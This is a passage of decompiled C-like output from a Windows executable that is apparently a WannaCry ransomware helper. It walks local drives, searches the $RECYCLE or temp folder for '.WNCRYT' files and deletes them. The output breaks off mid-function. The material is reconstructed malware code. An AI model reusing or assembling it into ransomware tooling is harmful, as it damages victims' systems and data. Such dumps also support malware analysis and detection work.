typedef unsigned char   undefined;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    dword hash;
    void *spare;
    char name[0];
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor *pType;
    ptrdiff_t dispCatchObj;
    void *addressOfHandler;
};

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef int __ehstate_t;

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (*action)(void);
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory:31;
    dword DataIsDirectory:1;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType *pHandlerArray;
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_FuncInfo FuncInfo;

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry *pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry *pTryBlockMap;
    uint nIPMapEntries;
    void *pIPToStateMap;
};

typedef ushort WORD;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

struct HINSTANCE__ {
    int unused;
};

typedef ulong DWORD;

typedef uchar BYTE;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef HINSTANCE HMODULE;

typedef struct _FILETIME FILETIME;

typedef int BOOL;

typedef BYTE *LPBYTE;

typedef uint UINT;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct Var Var, *PVar;

struct Var {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset:31;
    dword NameIsString:1;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct StringFileInfo StringFileInfo, *PStringFileInfo;

struct StringFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

struct IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct StringTable StringTable, *PStringTable;

struct StringTable {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct VS_VERSION_INFO VS_VERSION_INFO, *PVS_VERSION_INFO;

struct VS_VERSION_INFO {
    word StructLength;
    word ValueLength;
    word StructType;
    wchar16 Info[16];
    byte Padding[2];
    dword Signature;
    word StructVersion[2];
    word FileVersion[4];
    word ProductVersion[4];
    dword FileFlagsMask[2];
    dword FileFlags;
    dword FileOS;
    dword FileType;
    dword FileSubtype;
    dword FileTimestamp;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct VarFileInfo VarFileInfo, *PVarFileInfo;

struct VarFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct StringInfo StringInfo, *PStringInfo;

struct StringInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef void *HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _WIN32_FIND_DATAW _WIN32_FIND_DATAW, *P_WIN32_FIND_DATAW;

typedef struct _WIN32_FIND_DATAW *LPWIN32_FIND_DATAW;

typedef wchar_t WCHAR;

struct _WIN32_FIND_DATAW {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    WCHAR cFileName[260];
    WCHAR cAlternateFileName[14];
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef void *PVOID;

typedef ulong ULONG_PTR;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef CHAR *LPCSTR;

typedef WCHAR *LPCWSTR;

typedef WCHAR *LPWSTR;

typedef CONTEXT *PCONTEXT;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef struct basic_string<unsigned_short,struct_std::char_traits<unsigned_short>,class_std::allocator<unsigned_short>_> basic_string<unsigned_short,struct_std::char_traits<unsigned_short>,class_std::allocator<unsigned_short>_>, *Pbasic_string<unsigned_short,struct_std::char_traits<unsigned_short>,class_std::allocator<unsigned_short>_>;

struct basic_string<unsigned_short,struct_std::char_traits<unsigned_short>,class_std::allocator<unsigned_short>_> { // PlaceHolder Structure
};

typedef struct basic_string<unsigned_short,std::char_traits<unsigned_short>,std::allocator<unsigned_short>_> basic_string<unsigned_short,std::char_traits<unsigned_short>,std::allocator<unsigned_short>_>, *Pbasic_string<unsigned_short,std::char_traits<unsigned_short>,std::allocator<unsigned_short>_>;

struct basic_string<unsigned_short,std::char_traits<unsigned_short>,std::allocator<unsigned_short>_> { // PlaceHolder Structure
};

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef uint size_t;

typedef struct _startupinfo _startupinfo, *P_startupinfo;

struct _startupinfo {
    int newmode;
};



unicode u_$RECYCLE_00403020;
undefined *PTR__C_00402050;
undefined LAB_00401aa7;
void *ExceptionList;
unicode u_.WNCRYT_00403050;
undefined4 DAT_00403060;
undefined4 DAT_00403064;
undefined *PTR_npos_00402040;
undefined LAB_00401ad1;
undefined DAT_00403084;
undefined DAT_00403088;
undefined4 DAT_00403080;
undefined4 DAT_0040307c;
undefined *PTR__adjust_fdiv_00402080;
undefined DAT_0040308c;
int DAT_00403070;
int DAT_00403078;
int DAT_00403074;
undefined *PTR__acmdln_00402070;
undefined LAB_00401a78;
undefined DAT_00401a7c;
undefined DAT_004020a8;
undefined DAT_00403000;
undefined DAT_00403004;
undefined DAT_00403008;
undefined DAT_0040300c;

LPWSTR __cdecl FUN_00401000(int param_1,LPWSTR param_2)

{
  size_t sVar1;
  
  GetWindowsDirectoryW(param_2,0x104);
  if ((wchar_t *)(uint)(ushort)*param_2 == (wchar_t *)(param_1 + 0x41)) {
    GetTempPathW(0x104,param_2);
    sVar1 = wcslen(param_2);
    if (sVar1 != 0) {
      sVar1 = wcslen(param_2);
      if (param_2[sVar1 - 1] == L'\\') {
        sVar1 = wcslen(param_2);
        param_2[sVar1 - 1] = L'\0';
        return param_2;
      }
    }
  }
  else {
    swprintf(param_2,0x403010,(wchar_t *)(param_1 + 0x41),u__RECYCLE_00403020);
  }
  return param_2;
}



int __cdecl FUN_00401080(int param_1)

{
  basic_string<> *pbVar1;
  bool bVar2;
  HANDLE hFindFile;
  size_t sVar3;
  BOOL BVar4;
  code *lpFileName;
  basic_string<> *pbVar5;
  int iVar6;
  basic_string<> *pbVar7;
  uint uVar8;
  int local_690;
  undefined1 local_68c [4];
  basic_string<> *local_688;
  basic_string<> *local_684;
  undefined4 local_680;
  basic_string<> local_67c [4];
  undefined2 *local_678;
  wchar_t local_66c [260];
  WCHAR local_464 [260];
  _WIN32_FIND_DATAW local_25c;
  void *local_c;
  undefined1 *puStack_8;
  int local_4;
  
  puStack_8 = &LAB_00401aa7;
  local_c = ExceptionList;
  local_688 = (basic_string<> *)0x0;
  local_684 = (basic_string<> *)0x0;
  local_680 = 0;
  local_4 = 0;
  local_690 = 0;
  ExceptionList = &local_c;
  FUN_00401000(param_1,local_464);
  swprintf(local_66c,0x403040,local_464,u__WNCRYT_00403050);
  hFindFile = FindFirstFileW(local_66c,&local_25c);
  pbVar7 = local_684;
  if (hFindFile == (HANDLE)0xffffffff) {
    local_4 = 0xffffffff;
    for (pbVar5 = local_688; pbVar5 != pbVar7; pbVar5 = pbVar5 + 0x10) {
      FUN_00401870(pbVar5,0);
    }
    FUN_004018d0(local_688);
    local_690 = 0;
  }
  else {
    do {
      swprintf(local_66c,0x403034,local_464,local_25c.cFileName);
      std::basic_string<>::_Tidy(local_67c,false);
      sVar3 = wcslen(local_66c);
      bVar2 = std::basic_string<>::_Grow(local_67c,sVar3,true);
      if (bVar2) {
        FUN_00401330(local_678,local_66c,sVar3);
        std::basic_string<>::_Eos(local_67c,sVar3);
      }
      local_4._0_1_ = 1;
      FUN_004013d0(local_68c,local_684,1,(basic_string<> *)local_67c);
      local_4 = (uint)local_4._1_3_ << 8;
      std::basic_string<>::_Tidy(local_67c,true);
      BVar4 = FindNextFileW(hFindFile,&local_25c);
    } while (BVar4 != 0);
    FindClose(hFindFile);
    iVar6 = 0;
    for (uVar8 = 0;
        (pbVar1 = local_684, pbVar5 = local_688, pbVar7 = local_688,
        local_688 != (basic_string<> *)0x0 && (uVar8 < (uint)((int)local_684 - (int)local_688 >> 4))
        ); uVar8 = uVar8 + 1) {
      lpFileName = *(code **)(local_688 + iVar6 + 4);
      if (*(code **)(local_688 + iVar6 + 4) == (code *)0x0) {
        lpFileName = _C_exref;
      }
      BVar4 = DeleteFileW((LPCWSTR)lpFileName);
      if (BVar4 != 0) {
        local_690 = local_690 + 1;
      }
      iVar6 = iVar6 + 0x10;
    }
    for (; pbVar7 != pbVar1; pbVar7 = pbVar7 + 0x10) {
      std::basic_string<>::_Tidy(pbVar7,true);
    }
    local_4 = 0xffffffff;
    local_684 = pbVar5;
    for (pbVar7 = local_688; pbVar7 != pbVar5; pbVar7 = pbVar7 + 0x10) {
      std::basic_string<>::_Tidy(pbVar7,true);
    }
    FUN_004018d0(local_688);
  }
  ExceptionList = local_c;
  return local_690;
}



undefined4 FUN_004012c0(void)

{
  DWORD DVar1;
  UINT UVar2;
  int iVar3;
  WCHAR local_8;
  undefined2 uStack_6;
  undefined4 local_4;
  
  DVar1 = GetLogicalDrives();
  iVar3 = 0x19;
  do {
    local_4 = DAT_00403064;
    _local_8 = CONCAT22((short)((uint)DAT_00403060 >> 0x10),(short)iVar3 + 0x41);
    if ((DVar1 >> ((byte)iVar3 & 0x1f) & 1) != 0) {
      UVar2 = GetDriveTypeW(&local_8);
      if (UVar2 != 4) {
        FUN_00401080(iVar3);
        Sleep(10);
      }
    }
    iVar3 = iVar3 + -1;
  } while (1 < iVar3);
  return 0;
}



void __cdecl FUN_00401330(undefined2 *param_1,undefined2 *param_2,int param_3)

{
  undefined2 uVar1;
  
  for (; param_3 != 0; param_3 = param_3 + -1) {
    uVar1 = *param_2;
    param_2 = param_2 + 1;
    *param_1 = uVar1;
    param_1 = param_1 + 1;
  }
  return;
}



void __fastcall FUN_00401360(int param_1)

{
  char cVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  
  iVar2 = *(int *)(param_1 + 8);
  for (iVar4 = *(int *)(param_1 + 4); iVar4 != iVar2; iVar4 = iVar4 + 0x10) {
    iVar3 = *(int *)(iVar4 + 4);
    if (iVar3 != 0) {
      cVar1 = *(char *)(iVar3 + -1);
      if ((cVar1 == '\0') || (cVar1 == -1)) {
        FUN_004018d0((void *)(iVar3 + -2));
      }
      else {
        *(char *)(iVar3 + -1) = cVar1 + -1;
      }
    }
    *(undefined4 *)(iVar4 + 4) = 0;
    *(undefined4 *)(iVar4 + 8) = 0;
    *(undefined4 *)(iVar4 + 0xc) = 0;
  }
  FUN_004018d0(*(void **)(param_1 + 4));
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  *(undefined4 *)(param_1 + 0xc) = 0;
  return;
}



void __thiscall
FUN_004013d0(void *this,basic_string<> *param_1,uint param_2,basic_string<> *param_3)

{
  basic_string<> *pbVar1;
  uint uVar2;
  int iVar3;
  basic_string<> *pbVar4;
  basic_string<> *pbVar5;
  int iVar6;
  basic_string<> *pbVar7;
  basic_string<> *pbVar8;
  
  pbVar5 = *(basic_string<> **)((int)this + 8);
  if ((uint)(*(int *)((int)this + 0xc) - (int)pbVar5 >> 4) < param_2) {
    iVar6 = *(int *)((int)this + 4);
    if ((iVar6 == 0) || (uVar2 = (int)pbVar5 - iVar6 >> 4, uVar2 <= param_2)) {
      uVar2 = param_2;
    }
    if (iVar6 == 0) {
      iVar6 = 0;
    }
    else {
      iVar6 = (int)pbVar5 - iVar6 >> 4;
    }
    iVar6 = uVar2 + iVar6;
    iVar3 = iVar6;
    if (iVar6 < 0) {
      iVar3 = 0;
    }
    pbVar4 = operator_new(iVar3 << 4);
    pbVar5 = pbVar4;
    for (pbVar7 = *(basic_string<> **)((int)this + 4); uVar2 = param_2, pbVar1 = pbVar5,
        pbVar7 != param_1; pbVar7 = pbVar7 + 0x10) {
      FUN_00401690(pbVar5,pbVar7);
      pbVar5 = pbVar5 + 0x10;
    }
    for (; uVar2 != 0; uVar2 = uVar2 - 1) {
      FUN_00401690(pbVar1,(basic_string<> *)param_3);
      pbVar1 = pbVar1 + 0x10;
    }
    pbVar5 = pbVar5 + param_2 * 0x10;
    pbVar7 = *(basic_string<> **)((int)this + 8);
    for (; param_1 != pbVar7; param_1 = param_1 + 0x10) {
      FUN_00401690(pbVar5,param_1);
      pbVar5 = pbVar5 + 0x10;
    }
    pbVar5 = *(basic_string<> **)((int)this + 8);
    for (pbVar7 = *(basic_string<> **)((int)this + 4); pbVar7 != pbVar5; pbVar7 = pbVar7 + 0x10) {
      std::basic_string<>::_Tidy(pbVar7,true);
    }
    FUN_004018d0(*(void **)((int)this + 4));
    iVar3 = *(int *)((int)this + 4);
    *(basic_string<> **)((int)this + 0xc) = pbVar4 + iVar6 * 0x10;
    if (iVar3 == 0) {
      *(basic_string<> **)((int)this + 4) = pbVar4;
      *(basic_string<> **)((int)this + 8) = pbVar4 + param_2 * 0x10;
      return;
    }
    *(basic_string<> **)((int)this + 4) = pbVar4;
    *(basic_string<> **)((int)this + 8) =
         pbVar4 + ((*(int *)((int)this + 8) - iVar3 >> 4) + param_2) * 0x10;
    return;
  }
  if ((uint)((int)pbVar5 - (int)param_1 >> 4) < param_2) {
    pbVar7 = param_1 + param_2 * 0x10;
    for (pbVar4 = param_1; pbVar4 != pbVar5; pbVar4 = pbVar4 + 0x10) {
      FUN_00401690(pbVar7,pbVar4);
      pbVar7 = pbVar7 + 0x10;
    }
    pbVar5 = *(basic_string<> **)((int)this + 8);
    for (iVar6 = param_2 - ((int)pbVar5 - (int)param_1 >> 4); iVar6 != 0; iVar6 = iVar6 + -1) {
      FUN_00401690(pbVar5,(basic_string<> *)param_3);
      pbVar5 = pbVar5 + 0x10;
    }
    pbVar5 = *(basic_string<> **)((int)this + 8);
    if (param_1 != pbVar5) {
      do {
        std::basic_string<>::assign(param_1,param_3,0,*(uint *)npos_exref);
        param_1 = param_1 + 0x10;
      } while (param_1 != pbVar5);
      *(uint *)((int)this + 8) = *(int *)((int)this + 8) + param_2 * 0x10;
      return;
    }
  }
  else {
    if (param_2 == 0) {
      return;
    }
    pbVar7 = pbVar5;
    for (pbVar4 = pbVar5 + param_2 * -0x10; pbVar4 != pbVar5; pbVar4 = pbVar4 + 0x10) {
      FUN_00401690(pbVar7,pbVar4);
      pbVar7 = pbVar7 + 0x10;
    }
    pbVar5 = *(basic_string<> **)((int)this + 8);
    pbVar8 = (basic_string<> *)(pbVar5 + param_2 * -0x10);
    while (param_1 != (basic_string<> *)pbVar8) {
      pbVar8 = pbVar8 + -0x10;
      pbVar5 = pbVar5 + -0x10;
      std::basic_string<>::assign(pbVar5,pbVar8,0,*(uint *)npos_exref);
    }
    pbVar5 = param_1 + param_2 * 0x10;
    for (; param_1 != pbVar5; param_1 = param_1 + 0x10) {
      std::basic_string<>::assign(param_1,param_3,0,*(uint *)npos_exref);
    }
  }
  *(int *)((int)this + 8) = *(int *)((int)this + 8) + param_2 * 0x10;
  return;
}



void __cdecl FUN_00401690(basic_string<> *param_1,basic_string<> *param_2)

{
  basic_string<> bVar1;
  undefined2 uVar2;
  int iVar3;
  bool bVar4;
  uint uVar5;
  undefined2 *puVar6;
  code *pcVar7;
  uint uVar8;
  uint uVar9;
  void *local_c;
  undefined1 *puStack_8;
  undefined4 local_4;
  
  puStack_8 = &LAB_00401ad1;
  local_c = ExceptionList;
  local_4 = 0;
  if (param_1 != (basic_string<> *)0x0) {
    bVar1 = *param_2;
    ExceptionList = &local_c;
    *(undefined4 *)(param_1 + 4) = 0;
    *param_1 = bVar1;
    *(undefined4 *)(param_1 + 8) = 0;
    *(undefined4 *)(param_1 + 0xc) = 0;
    uVar8 = *(uint *)npos_exref;
    uVar5 = *(uint *)(param_2 + 8);
    uVar9 = uVar5;
    if (uVar8 < uVar5) {
      uVar9 = uVar8;
    }
    if (param_1 == param_2) {
      if (uVar9 != 0) {
        std::_Xran();
      }
      std::basic_string<>::_Split(param_1);
      uVar5 = *(int *)(param_1 + 8) - uVar9;
      if (uVar5 < uVar8) {
        uVar8 = uVar5;
      }
      if (uVar8 != 0) {
        FUN_00401810((undefined2 *)(*(int *)(param_1 + 4) + uVar9 * 2),
                     (undefined2 *)(*(int *)(param_1 + 4) + (uVar8 + uVar9) * 2),uVar5 - uVar8);
        iVar3 = *(int *)(param_1 + 8);
        bVar4 = std::basic_string<>::_Grow(param_1,iVar3 - uVar8,false);
        if (bVar4) {
          std::basic_string<>::_Eos(param_1,iVar3 - uVar8);
        }
      }
      std::basic_string<>::_Split(param_1);
      ExceptionList = local_c;
      return;
    }
    if ((uVar9 != 0) && (uVar9 == uVar5)) {
      pcVar7 = *(code **)(param_2 + 4);
      if (*(code **)(param_2 + 4) == (code *)0x0) {
        pcVar7 = _C_exref;
      }
      if ((byte)pcVar7[-1] < 0xfe) {
        std::basic_string<>::_Tidy(param_1,true);
        pcVar7 = *(code **)(param_2 + 4);
        if (*(code **)(param_2 + 4) == (code *)0x0) {
          pcVar7 = _C_exref;
        }
        *(code **)(param_1 + 4) = pcVar7;
        *(undefined4 *)(param_1 + 8) = *(undefined4 *)(param_2 + 8);
        *(undefined4 *)(param_1 + 0xc) = *(undefined4 *)(param_2 + 0xc);
        pcVar7[-1] = (code)((char)pcVar7[-1] + '\x01');
        ExceptionList = local_c;
        return;
      }
    }
    bVar4 = std::basic_string<>::_Grow(param_1,uVar9,true);
    if (bVar4) {
      pcVar7 = *(code **)(param_2 + 4);
      if (*(code **)(param_2 + 4) == (code *)0x0) {
        pcVar7 = _C_exref;
      }
      puVar6 = *(undefined2 **)(param_1 + 4);
      for (uVar8 = uVar9; uVar8 != 0; uVar8 = uVar8 - 1) {
        uVar2 = *(undefined2 *)pcVar7;
        pcVar7 = pcVar7 + 2;
        *puVar6 = uVar2;
        puVar6 = puVar6 + 1;
      }
      *(uint *)(param_1 + 8) = uVar9;
      *(undefined2 *)(*(int *)(param_1 + 4) + uVar9 * 2) = 0;
    }
  }
  ExceptionList = local_c;
  return;
}



void __cdecl FUN_00401810(undefined2 *param_1,undefined2 *param_2,int param_3)

{
  undefined2 *puVar1;
  undefined2 uVar2;
  undefined2 *puVar3;
  undefined2 *puVar4;
  
  if ((param_2 < param_1) && (puVar3 = param_2 + param_3, param_1 < puVar3)) {
    puVar4 = param_1 + param_3;
    if (param_3 != 0) {
      do {
        puVar1 = puVar3 + -1;
        puVar3 = puVar3 + -1;
        puVar4 = puVar4 + -1;
        param_3 = param_3 + -1;
        *puVar4 = *puVar1;
      } while (param_3 != 0);
      return;
    }
  }
  else {
    for (; param_3 != 0; param_3 = param_3 + -1) {
      uVar2 = *param_2;
